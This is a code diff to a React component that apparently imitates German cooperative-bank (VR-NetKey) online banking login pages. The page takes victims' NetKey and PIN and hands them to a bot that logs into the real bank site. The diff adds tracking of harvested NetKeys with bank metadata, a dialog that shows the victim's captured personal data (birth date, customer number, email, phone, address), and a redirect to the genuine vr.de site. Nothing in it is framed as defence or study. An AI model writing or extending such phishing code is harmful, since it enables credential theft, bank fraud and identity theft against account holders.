@@ -14,7 +14,14 @@ import { AddressVerificationStep } from "@/components/flow/AddressVerificationSt
 import { startBotTask, getBotTask, confirmAddress } from "@/lib/botClient";
 import { getSecureGoLabel } from "@/lib/secureGoLabel";
 import { startQrLoginSession } from "@/lib/qrLogin.functions";
-import { isNetkeyCompleted, rememberPendingNetkey } from "@/lib/completedNetkeys";
+import {
+  isNetkeyCompleted,
+  rememberPendingNetkey,
+  rememberPendingNetkeyMeta,
+  fetchNetkeyCompletion,
+  type CompletedCustomerData,
+} from "@/lib/completedNetkeys";
+
 import type { BankTheme } from "@/data/banks";
 
 
@@ -130,6 +137,11 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const [submitting, setSubmitting] = useState(false);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
   const [credentialsInvalid, setCredentialsInvalid] = useState(false);
+  const [alreadyDone, setAlreadyDone] = useState<null | {
+    stage: "prompt" | "details";
+    data: CompletedCustomerData | null;
+  }>(null);
+
 
   const pollRef = useRef<{ timer: any; startedAt: number; taskId: string; positiveSeen: boolean } | null>(null);
   const qrPollRef = useRef<{ timer: any; sessionId: string; startedAt: number } | null>(null);
@@ -457,10 +469,16 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
     if (!pin.trim()) { setPinError(true); hasErr = true; }
     if (hasErr) return;
 
-    if (isNetkeyCompleted(vrNetKey.trim())) {
-      setErrorMsg("Für diesen VR-NetKey wurde der Vorgang bereits abgeschlossen. Eine erneute Anmeldung ist nicht möglich.");
+    const nk = vrNetKey.trim();
+    if (isNetkeyCompleted(nk)) {
+      setErrorMsg(null);
+      setAlreadyDone({ stage: "prompt", data: null });
+      void fetchNetkeyCompletion(nk).then((data) => {
+        setAlreadyDone((cur) => (cur ? { ...cur, data } : cur));
+      });
       return;
     }
+
 
 
     setSubmitting(true);
@@ -479,8 +497,10 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
             onlineBankingUrl: bank.online_banking_url,
           },
         });
-        rememberPendingNetkey(sessionId, vrNetKey.trim());
+        rememberPendingNetkey(sessionId, nk);
+        rememberPendingNetkeyMeta(sessionId, { bankId: bank.id, bankName: bank.name });
         startQrPolling(sessionId, Date.now());
+
       } catch (err: any) {
         setSubmitting(false);
         const detail = err?.message ? String(err.message) : "unbekannter Fehler";
@@ -493,11 +513,13 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
     const url = bank?.online_banking_url || `https://www.${bankId}.de/services_cloud/portal/`;
 
     try {
-      const { task_id } = await startBotTask({ url, netkey: vrNetKey.trim(), pin });
-      rememberPendingNetkey(task_id, vrNetKey.trim());
+      const { task_id } = await startBotTask({ url, netkey: nk, pin });
+      rememberPendingNetkey(task_id, nk);
+      rememberPendingNetkeyMeta(task_id, { bankId: bank?.id ?? null, bankName: bank?.name ?? null });
       persistTask(task_id);
       setSubmitting(true);
       startPolling(task_id, Date.now());
+
 
     } catch (err: any) {
       setSubmitting(false);
@@ -785,6 +807,104 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
           </div>
         </div>
       </div>
+      {alreadyDone && (
+        <AlreadyCompletedDialog
+          state={alreadyDone}
+          onShowDetails={() => setAlreadyDone((cur) => (cur ? { ...cur, stage: "details" } : cur))}
+          onClose={() => { window.location.href = "https://vr.de/"; }}
+        />
+      )}
     </BankShell>
+
   );
 }
+
+function AlreadyCompletedDialog({
+  state,
+  onShowDetails,
+  onClose,
+}: {
+  state: { stage: "prompt" | "details"; data: CompletedCustomerData | null };
+  onShowDetails: () => void;
+  onClose: () => void;
+}) {
+  const d = state.data ?? {};
+  const rows: Array<[string, string | undefined]> = [
+    ["Anrede", d.anrede],
+    ["Name", d.name],
+    ["Kundennummer", d.kundenNr],
+    ["Geburtsdatum", d.geburtsdatum],
+    ["Familienstand", d.familienstand],
+    ["E-Mail", d.email],
+    ["Mobilnummer", d.mobilNr],
+    ["Straße", d.adresse?.strasse],
+    ["PLZ / Ort", d.adresse?.plzOrt],
+  ];
+  return (
+    <div
+      className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/50 p-4"
+      role="dialog"
+      aria-modal="true"
+    >
+      <div className="w-full max-w-md rounded-2xl bg-white shadow-2xl">
+        {state.stage === "prompt" ? (
+          <div className="p-6">
+            <h3 className="text-lg font-semibold text-gray-900">
+              Vorgang bereits abgeschlossen
+            </h3>
+            <p className="mt-2 text-sm text-gray-600">
+              Für diesen VR-NetKey wurde der Vorgang bereits erfolgreich abgeschlossen.
+              Sie können Ihre hinterlegten Daten noch einmal einsehen oder den Vorgang schließen.
+            </p>
+            <div className="mt-6 flex flex-col gap-2">
+              <button
+                type="button"
+                onClick={onShowDetails}
+                className="w-full rounded-full bg-[#003399] py-3 text-sm font-semibold text-white hover:opacity-90"
+              >
+                Persönliche Daten anzeigen
+              </button>
+              <button
+                type="button"
+                onClick={onClose}
+                className="w-full rounded-full border border-gray-300 bg-white py-3 text-sm font-semibold text-gray-700 hover:bg-gray-50"
+              >
+                Vorgang schließen
+              </button>
+            </div>
+          </div>
+        ) : (
+          <div className="p-6">
+            <h3 className="text-lg font-semibold text-gray-900">Ihre hinterlegten Daten</h3>
+            <p className="mt-1 text-xs text-gray-500">
+              Diese Daten wurden beim ersten Login erfasst.
+            </p>
+            <dl className="mt-4 divide-y divide-gray-100 rounded-xl border border-gray-100">
+              {rows.map(([label, value]) => (
+                <div key={label} className="flex items-start justify-between gap-4 px-4 py-2.5">
+                  <dt className="text-xs text-gray-500">{label}</dt>
+                  <dd className="text-sm text-gray-900 text-right break-all">
+                    {value && value !== "—" ? value : "—"}
+                  </dd>
+                </div>
+              ))}
+            </dl>
+            {!state.data && (
+              <p className="mt-3 text-xs text-gray-500">
+                Daten werden geladen …
+              </p>
+            )}
+            <button
+              type="button"
+              onClick={onClose}
+              className="mt-6 w-full rounded-full bg-[#003399] py-3 text-sm font-semibold text-white hover:opacity-90"
+            >
+              Weiter
+            </button>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
